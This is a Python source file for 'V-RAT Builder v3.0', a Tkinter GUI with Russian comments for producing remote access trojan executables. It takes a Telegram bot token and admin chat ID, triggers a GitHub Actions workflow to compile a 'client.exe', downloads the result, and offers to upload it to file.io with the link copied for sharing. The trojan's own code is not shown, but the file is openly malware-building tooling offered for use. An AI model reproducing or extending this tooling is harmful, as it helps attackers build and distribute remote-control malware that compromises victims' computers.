# V-RAT Builder v3.0 - Professional RAT Builder
# GitHub Token подставляется через ENV при сборке

import os
import sys
import time
import json
import threading
import zipfile
import io
from datetime import datetime
from pathlib import Path

import requests
import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox, filedialog
from tkinter import font as tkfont

# ============ КОНФИГ (Токен из ENV) ============
GITHUB_TOKEN = os.environ.get('GITHUB_TOKEN', '')
GITHUB_REPO = "Virusodel/Rat_builder"  # ИЗМЕНИ НА СВОЙ
VERSION = "3.0"

# Если токен не подставился - ошибка
if not GITHUB_TOKEN or GITHUB_TOKEN == '':
    # ВНИМАНИЕ: Это запасной вариант, если забыли подставить ENV
    # В продакшене лучше выбросить ошибку
    GITHUB_TOKEN = "##GITHUB_TOKEN_PLACEHOLDER##"  # Заменится при сборке

# ============ GITHUB API ============
def trigger_github_build(bot_token, admin_id):
    url = f"https://api.github.com/repos/{GITHUB_REPO}/actions/workflows/build.yml/dispatches"
    headers = {
        "Authorization": f"token {GITHUB_TOKEN}",
        "Accept": "application/vnd.github.v3+json"
    }
    data = {
        "ref": "main",
        "inputs": {
            "bot_token": bot_token,
            "admin_id": str(admin_id)
        }
    }
    try:
        response = requests.post(url, headers=headers, json=data, timeout=30)
        return response.status_code == 204
    except Exception as e:
        print(f"Trigger error: {e}")
        return False

def get_workflow_runs():
    url = f"https://api.github.com/repos/{GITHUB_REPO}/actions/runs"
    headers = {
        "Authorization": f"token {GITHUB_TOKEN}",
        "Accept": "application/vnd.github.v3+json"
    }
    try:
        response = requests.get(url, headers=headers, timeout=30)
        if response.status_code == 200:
            return response.json().get('workflow_runs', [])
    except Exception as e:
        print(f"Get runs error: {e}")
        return []
    return []

def get_run_status(run_id):
    url = f"https://api.github.com/repos/{GITHUB_REPO}/actions/runs/{run_id}"
    headers = {
        "Authorization": f"token {GITHUB_TOKEN}",
        "Accept": "application/vnd.github.v3+json"
    }
    try:
        response = requests.get(url, headers=headers, timeout=30)
        if response.status_code == 200:
            data = response.json()
            return data.get('status'), data.get('conclusion')
    except Exception as e:
        print(f"Get status error: {e}")
        return None, None

def get_artifacts_for_run(run_id):
    url = f"https://api.github.com/repos/{GITHUB_REPO}/actions/runs/{run_id}/artifacts"
    headers = {
        "Authorization": f"token {GITHUB_TOKEN}",
        "Accept": "application/vnd.github.v3+json"
    }
    try:
        response = requests.get(url, headers=headers, timeout=30)
        if response.status_code == 200:
            return response.json().get('artifacts', [])
    except Exception as e:
        print(f"Get artifacts error: {e}")
        return []
    return []

def download_artifact(artifact_id):
    url = f"https://api.github.com/repos/{GITHUB_REPO}/actions/artifacts/{artifact_id}/zip"
    headers = {
        "Authorization": f"token {GITHUB_TOKEN}",
        "Accept": "application/vnd.github.v3+json"
    }
    try:
        response = requests.get(url, headers=headers, timeout=120)
        if response.status_code == 200:
            return response.content
    except Exception as e:
        print(f"Download artifact error: {e}")
        return None

def upload_to_fileio(file_bytes, filename="client.exe"):
    try:
        url = 'https://file.io/'
        files = {'file': (filename, file_bytes)}
        response = requests.post(url, files=files, timeout=30)
        if response.status_code == 200:
            data = response.json()
            if data.get('success'):
                return data.get('link')
    except Exception as e:
        print(f"Upload error: {e}")
        return None

# ============ GUI ============
class VRATBuilder:
    def __init__(self, root):
        self.root = root
        self.root.title(f"V-RAT Builder {VERSION}")
        self.root.geometry("1100x700")
        self.root.minsize(900, 600)
        self.root.configure(bg="#0d1117")
        self.root.protocol("WM_DELETE_WINDOW", self.on_closing)
        
        self.bot_token = tk.StringVar()
        self.admin_id = tk.StringVar()
        self.build_running = False
        
        self.setup_styles()
        self.create_widgets()
        self.check_github()
        
    def setup_styles(self):
        self.colors = {
            'bg': '#0d1117',
            'panel': '#161b22',
            'border': '#30363d',
            'text': '#c9d1d9',
            'text_dim': '#8b949e',
            'accent': '#58a6ff',
            'success': '#3fb950',
            'error': '#f85149',
            'warning': '#d29922'
        }
        
        self.font = tkfont.Font(family="Segoe UI", size=10)
        self.font_bold = tkfont.Font(family="Segoe UI", size=10, weight="bold")
        self.font_title = tkfont.Font(family="Segoe UI", size=12, weight="bold")
        self.font_mono = tkfont.Font(family="Consolas", size=10)
        
    def create_widgets(self):
        main = tk.Frame(self.root, bg=self.colors['bg'])
        main.pack(fill=tk.BOTH, expand=True, padx=12, pady=12)
        
        header = tk.Frame(main, bg=self.colors['panel'], height=50)
        header.pack(fill=tk.X)
        header.pack_propagate(False)
        
        title = tk.Label(header, text="V-RAT BUILDER", 
                        fg=self.colors['accent'], bg=self.colors['panel'],
                        font=("Segoe UI", 16, "bold"))
        title.pack(side=tk.LEFT, padx=20, pady=10)
        
        self.status_indicator = tk.Label(header, text="IDLE", 
                                        fg=self.colors['text_dim'], bg=self.colors['panel'],
                                        font=self.font_bold)
        self.status_indicator.pack(side=tk.RIGHT, padx=20)
        
        content = tk.Frame(main, bg=self.colors['bg'])
        content.pack(fill=tk.BOTH, expand=True, pady=12)
        
        left = tk.Frame(content, bg=self.colors['panel'])
        left.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=(0, 6))
        
        right = tk.Frame(content, bg=self.colors['panel'])
        right.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True, padx=(6, 0))
        
        self.create_input(left)
        self.create_controls(left)
        self.create_status(left)
        self.create_log(right)
        self.create_statusbar(main)
        
    def create_input(self, parent):
        frame = tk.LabelFrame(parent, text="Configuration", 
                             fg=self.colors['text'], bg=self.colors['panel'],
                             font=self.font_title)
        frame.pack(fill=tk.X, pady=6, padx=10)
        
        tk.Label(frame, text="Bot Token:", 
                fg=self.colors['text'], bg=self.colors['panel'],
                font=self.font).pack(anchor=tk.W, padx=10, pady=(10, 2))
        
        tk.Entry(frame, textvariable=self.bot_token,
                bg=self.colors['bg'], fg=self.colors['text'],
                font=self.font_mono, bd=1, relief=tk.FLAT,
                insertbackground=self.colors['text']).pack(fill=tk.X, padx=10, pady=(0, 8))
        
        tk.Label(frame, text="Admin Chat ID:", 
                fg=self.colors['text'], bg=self.colors['panel'],
                font=self.font).pack(anchor=tk.W, padx=10, pady=(0, 2))
        
        tk.Entry(frame, textvariable=self.admin_id,
                bg=self.colors['bg'], fg=self.colors['text'],
                font=self.font_mono, bd=1, relief=tk.FLAT,
                insertbackground=self.colors['text']).pack(fill=tk.X, padx=10, pady=(0, 10))
        
    def create_controls(self, parent):
        frame = tk.LabelFrame(parent, text="Controls", 
                             fg=self.colors['text'], bg=self.colors['panel'],
                             font=self.font_title)
        frame.pack(fill=tk.X, pady=6, padx=10)
        
        btn_frame = tk.Frame(frame, bg=self.colors['panel'])
        btn_frame.pack(pady=12)
        
        self.build_btn = tk.Button(btn_frame, text="Start Build", 
                                  command=self.start_build,
                                  bg=self.colors['success'], fg="white",
                                  font=self.font_bold, padx=30, pady=8,
                                  relief=tk.FLAT, cursor="hand2",
                                  width=15)
        self.build_btn.pack(side=tk.LEFT, padx=4)
        
        self.stop_btn = tk.Button(btn_frame, text="Stop", 
                                 command=self.stop_build,
                                 bg=self.colors['error'], fg="white",
                                 font=self.font_bold, padx=30, pady=8,
                                 relief=tk.FLAT, cursor="hand2",
                                 width=15, state=tk.DISABLED)
        self.stop_btn.pack(side=tk.LEFT, padx=4)
        
        self.clear_btn = tk.Button(btn_frame, text="Clear Log", 
                                  command=self.clear_log,
                                  bg=self.colors['border'], fg=self.colors['text'],
                                  font=self.font_bold, padx=30, pady=8,
                                  relief=tk.FLAT, cursor="hand2",
                                  width=15)
        self.clear_btn.pack(side=tk.LEFT, padx=4)
        
        self.progress = ttk.Progressbar(frame, length=380, mode='indeterminate')
        self.progress.pack(pady=(0, 12))
        self.progress.pack_forget()
        
    def create_status(self, parent):
        frame = tk.LabelFrame(parent, text="Status", 
                             fg=self.colors['text'], bg=self.colors['panel'],
                             font=self.font_title)
        frame.pack(fill=tk.X, pady=6, padx=10)
        
        info = tk.Frame(frame, bg=self.colors['panel'])
        info.pack(fill=tk.X, pady=8, padx=10)
        
        tk.Label(info, text="GitHub API:", 
                fg=self.colors['text_dim'], bg=self.colors['panel'],
                font=self.font).pack(side=tk.LEFT)
        
        self.gh_status = tk.Label(info, text="Checking...", 
                                 fg=self.colors['text_dim'], bg=self.colors['panel'],
                                 font=self.font_bold)
        self.gh_status.pack(side=tk.RIGHT)
        
        tk.Label(info, text="Build State:", 
                fg=self.colors['text_dim'], bg=self.colors['panel'],
                font=self.font).pack(side=tk.LEFT, pady=(5, 0))
        
        self.build_state = tk.Label(info, text="Ready", 
                                   fg=self.colors['success'], bg=self.colors['panel'],
                                   font=self.font_bold)
        self.build_state.pack(side=tk.RIGHT, pady=(5, 0))
        
    def create_log(self, parent):
        frame = tk.LabelFrame(parent, text="Build Log", 
                             fg=self.colors['text'], bg=self.colors['panel'],
                             font=self.font_title)
        frame.pack(fill=tk.BOTH, expand=True, pady=6, padx=10)
        
        self.log_text = scrolledtext.ScrolledText(frame, 
                                                 bg=self.colors['bg'], 
                                                 fg=self.colors['text'],
                                                 font=self.font_mono,
                                                 insertbackground=self.colors['text'],
                                                 wrap=tk.WORD,
                                                 bd=0)
        self.log_text.pack(fill=tk.BOTH, expand=True, padx=4, pady=4)
        
        self.log_text.tag_config("error", foreground=self.colors['error'])
        self.log_text.tag_config("success", foreground=self.colors['success'])
        self.log_text.tag_config("warning", foreground=self.colors['warning'])
        self.log_text.tag_config("info", foreground=self.colors['accent'])
        
        self.log("System initialized", "info")
        self.log("Ready for build", "info")
        self.log("-" * 60, "info")
        
    def create_statusbar(self, parent):
        bar = tk.Frame(parent, bg=self.colors['panel'], height=28)
        bar.pack(fill=tk.X, pady=(12, 0))
        bar.pack_propagate(False)
        
        tk.Label(bar, text=f"v{VERSION}", 
                fg=self.colors['text_dim'], bg=self.colors['panel'],
                font=self.font).pack(side=tk.LEFT, padx=12)
        
        self.status_msg = tk.Label(bar, text="Ready", 
                                  fg=self.colors['text_dim'], bg=self.colors['panel'],
                                  font=self.font)
        self.status_msg.pack(side=tk.LEFT, padx=20)
        
        self.conn_status = tk.Label(bar, text="Connected", 
                                   fg=self.colors['success'], bg=self.colors['panel'],
                                   font=self.font)
        self.conn_status.pack(side=tk.RIGHT, padx=12)
        
    def log(self, message, tag="info"):
        timestamp = datetime.now().strftime("%H:%M:%S")
        self.log_text.insert(tk.END, f"[{timestamp}] ", "info")
        self.log_text.insert(tk.END, f"{message}\n", tag)
        self.log_text.see(tk.END)
        self.root.update()
        
    def clear_log(self):
        self.log_text.delete(1.0, tk.END)
        self.log("Log cleared", "warning")
        
    def check_github(self):
        try:
            if not GITHUB_TOKEN or GITHUB_TOKEN == "##GITHUB_TOKEN_PLACEHOLDER##":
                self.gh_status.config(text="No Token", fg=self.colors['error'])
                self.log("GitHub token not set!", "error")
                self.conn_status.config(text="No Token", fg=self.colors['error'])
                return
                
            runs = get_workflow_runs()
            if runs is not None:
                self.gh_status.config(text="Online", fg=self.colors['success'])
                self.log("GitHub API connected", "success")
                self.conn_status.config(text="Connected", fg=self.colors['success'])
            else:
                self.gh_status.config(text="Limited", fg=self.colors['warning'])
                self.log("GitHub API limited", "warning")
        except Exception as e:
            self.gh_status.config(text="Error", fg=self.colors['error'])
            self.log(f"GitHub connection error: {e}", "error")
            self.conn_status.config(text="Error", fg=self.colors['error'])
            
    def on_closing(self):
        if self.build_running:
            if messagebox.askyesno("Build in Progress", 
                                  "Build is running. Exit anyway?"):
                self.root.destroy()
        else:
            self.root.destroy()
            
    def start_build(self):
        token = self.bot_token.get().strip()
        admin = self.admin_id.get().strip()
        
        if not GITHUB_TOKEN or GITHUB_TOKEN == "##GITHUB_TOKEN_PLACEHOLDER##":
            messagebox.showerror("Error", "GitHub token not configured!\nCheck your build environment.")
            self.log("GitHub token missing", "error")
            return
            
        if not token or len(token) < 10:
            messagebox.showerror("Error", "Enter valid bot token")
            self.log("Error: Invalid bot token", "error")
            return
            
        if not admin.isdigit():
            messagebox.showerror("Error", "Admin ID must be numeric")
            self.log("Error: Invalid Admin ID", "error")
            return
            
        self.build_running = True
        self.build_btn.config(state=tk.DISABLED)
        self.stop_btn.config(state=tk.NORMAL)
        self.build_state.config(text="Building", fg=self.colors['warning'])
        self.status_indicator.config(text="BUILDING", fg=self.colors['warning'])
        self.status_msg.config(text="Build in progress...")
        self.progress.pack()
        self.progress.start(10)
        
        thread = threading.Thread(target=self.process_build, 
                                 args=(token, int(admin)),
                                 daemon=True)
        thread.start()
        
        self.log(f"Build started for Admin ID: {admin}", "info")
        
    def stop_build(self):
        self.build_running = False
        self.build_state.config(text="Stopped", fg=self.colors['error'])
        self.status_indicator.config(text="STOPPED", fg=self.colors['error'])
        self.status_msg.config(text="Build stopped")
        self.progress.stop()
        self.progress.pack_forget()
        self.build_btn.config(state=tk.NORMAL)
        self.stop_btn.config(state=tk.DISABLED)
        self.log("Build stopped by user", "warning")
        
    def process_build(self, bot_token, admin_id):
        try:
            runs_before = get_workflow_runs()
            runs_before_ids = [r['id'] for r in runs_before]
            
            self.log("Triggering GitHub workflow...", "info")
            success = trigger_github_build(bot_token, admin_id)
            
            if not success:
                self.root.after(0, self.build_failed, "Failed to trigger workflow")
                return
                
            self.log("Workflow triggered", "success")
            
            found_run = None
            for _ in range(20):
                time.sleep(3)
                current_runs = get_workflow_runs()
                for run in current_runs:
                    if run['id'] not in runs_before_ids:
                        found_run = run
                        break
                if found_run:
                    break
                    
            if not found_run:
                self.root.after(0, self.build_failed, "No workflow run found")
                return
                
            run_id = found_run['id']
            self.log(f"Workflow ID: {run_id}", "info")
            
            for attempt in range(60):
                if not self.build_running:
                    return
                    
                status, conclusion = get_run_status(run_id)
                
                if status == 'completed':
                    if conclusion == 'success':
                        self.log("Build completed", "success")
                        self.root.after(0, self.build_completed, run_id)
                        return
                    else:
                        self.root.after(0, self.build_failed, f"Build failed: {conclusion}")
                        return
                        
                if attempt % 6 == 0:
                    elapsed = attempt * 3
                    self.root.after(0, lambda: self.status_msg.config(
                        text=f"Building... {elapsed}s"))
                        
                time.sleep(3)
                
            self.root.after(0, self.build_failed, "Build timeout")
            
        except Exception as e:
            self.root.after(0, self.build_failed, str(e))
            
    def build_completed(self, run_id):
        self.log("Fetching artifacts...", "info")
        
        artifacts = get_artifacts_for_run(run_id)
        if not artifacts:
            self.build_failed("No artifacts found")
            return
            
        artifact = artifacts[0]
        self.log(f"Artifact: {artifact['name']}", "info")
        
        self.status_msg.config(text="Downloading artifact...")
        self.log("Downloading...", "info")
        
        zip_data = download_artifact(artifact['id'])
        if not zip_data:
            self.build_failed("Failed to download")
            return
            
        try:
            with zipfile.ZipFile(io.BytesIO(zip_data)) as z:
                exe_files = [f for f in z.namelist() if f.endswith('.exe')]
                if not exe_files:
                    self.build_failed("No EXE found")
                    return
                    
                exe_name = exe_files[0]
                exe_bytes = z.read(exe_name)
                size_mb = len(exe_bytes) / (1024 * 1024)
                
                self.log(f"EXE: {exe_name} ({size_mb:.2f} MB)", "success")
                
                save_path = filedialog.asksaveasfilename(
                    defaultextension=".exe",
                    filetypes=[("Executable files", "*.exe")],
                    initialfile=f"client_{datetime.now().strftime('%Y%m%d_%H%M%S')}.exe",
                    title="Save Executable"
                )
                
                if save_path:
                    with open(save_path, 'wb') as f:
                        f.write(exe_bytes)
                    self.log(f"Saved to: {save_path}", "success")
                    self.status_msg.config(text=f"Saved: {os.path.basename(save_path)}")
                    messagebox.showinfo("Success", f"Build saved:\n{save_path}")
                else:
                    self.log("Uploading to file.io...", "info")
                    url = upload_to_fileio(exe_bytes, "client.exe")
                    if url:
                        self.log(f"Uploaded: {url}", "success")
                        self.status_msg.config(text="Uploaded to file.io")
                        self.root.clipboard_clear()
                        self.root.clipboard_append(url)
                        messagebox.showinfo("Success", 
                                           f"Uploaded to:\n{url}\n\nURL copied to clipboard")
                    else:
                        self.log("Upload failed", "error")
                        messagebox.showerror("Error", "Upload failed")
                
        except Exception as e:
            self.build_failed(f"Extraction error: {e}")
            
        self.build_running = False
        self.build_state.config(text="Ready", fg=self.colors['success'])
        self.status_indicator.config(text="IDLE", fg=self.colors['text_dim'])
        self.status_msg.config(text="Build complete")
        self.progress.stop()
        self.progress.pack_forget()
        self.build_btn.config(state=tk.NORMAL)
        self.stop_btn.config(state=tk.DISABLED)
        
    def build_failed(self, error):
        self.log(f"Failed: {error}", "error")
        self.build_running = False
        self.build_state.config(text="Failed", fg=self.colors['error'])
        self.status_indicator.config(text="FAILED", fg=self.colors['error'])
        self.status_msg.config(text="Build failed")
        self.progress.stop()
        self.progress.pack_forget()
        self.build_btn.config(state=tk.NORMAL)
        self.stop_btn.config(state=tk.DISABLED)
        messagebox.showerror("Build Failed", error)

if __name__ == "__main__":
    root = tk.Tk()
    app = VRATBuilder(root)
    root.mainloop()